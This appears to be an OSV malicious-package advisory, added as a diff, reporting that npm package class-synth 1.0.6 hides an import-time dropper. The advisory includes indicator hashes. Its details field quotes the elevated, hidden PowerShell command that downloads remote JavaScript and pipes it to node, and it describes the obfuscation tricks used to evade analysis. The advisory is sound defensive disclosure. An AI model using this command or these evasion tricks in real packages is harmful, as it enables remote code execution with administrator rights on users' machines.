@@ -1,0 +1,75 @@
+{
+  "modified": "2026-06-13T07:07:36Z",
+  "published": "2026-06-13T07:07:36Z",
+  "schema_version": "1.7.4",
+  "id": "",
+  "summary": "class-synth ships an import-time elevated PowerShell dropper that executes attacker-controlled remote JavaScript",
+  "details": "On every require/import of dist/index.js, an async IIFE walks process.cwd() for.css files containing an `@sri-hash: \u003cciphertext\u003e` marker, AES-256-CBC-decrypts the marker with a hardcoded key (split across an 8-element array and joined at runtime) to recover a URL, then spawns a hidden, UAC-elevated PowerShell process via `Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -Command \"irm \u003curl\u003e | node -\"' -Verb RunAs` to fetch and execute arbitrary JavaScript as Administrator. Node built-ins (node:fs, node:path, node:child_process, node:crypto) are loaded through base64-decoded specifiers and `process` is acquired via `new Function('return typeof process!== \"undefined\"? process: null;')` to defeat static analysis. The recovered URL is mutable (an attacker controls it by planting an `@sri-hash` marker in any.css file in the working tree) and there is no signature or hash verification on the fetched payload. The package is padded with ~1000+ trivial dummy exports (isWithinBoundaryN, applyPresetN, createSequenceStepN, mapOperationN, checkConstraintN) to camouflage the ~50-line malicious __init IIFE at the bottom of the bundle; the README/package.json advertise only class merging, styling, and date formatting, none of which justifies fs, child_process, crypto, AES, or PowerShell elevation.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "class-synth"
+      },
+      "versions": [
+        "1.0.6"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "dist/index.js",
+              "sha256": "a20c4428f1282bd8035c7e7ea1e53465a5e3c9ffd154a102a5ad2e6458b026fb",
+              "tlsh": "01c300ca72a23132d32b686048bf018bf377dda0177e4481d159a2adb63441ea5b7f7d"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "class-synth-1.0.6.tgz",
+              "hashes": {
+                "sha1": "06b03a532dd57c0ce4a0c4aa5e726c79be0c6680",
+                "sha512_sri": "sha512-rYC7heU8uLC5ONpq8DUPST7JIpZl3F5w7qudgzJySLyQ9j6Vjk0qfItIIKeQORvhHXW+fZiZSN21I68XYJPGlw=="
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/class-synth/v/1.0.6"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "type": "FINDER",
+      "contact": [
+        "inspector-research@amazon.com"
+      ]
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "source": "amazon-inspector",
+        "sha256": "3fe05a486e4cce2e9eb36558714ff75d3a7ff7db300c46095087db274451ed7d",
+        "import_time": "2026-06-13T07:25:40.63730102Z",
+        "id": "IN-MAL-2026-006333",
+        "modified_time": "2026-06-13T07:07:36Z",
+        "versions": [
+          "1.0.6"
+        ]
+      }
+    ]
+  }
+}
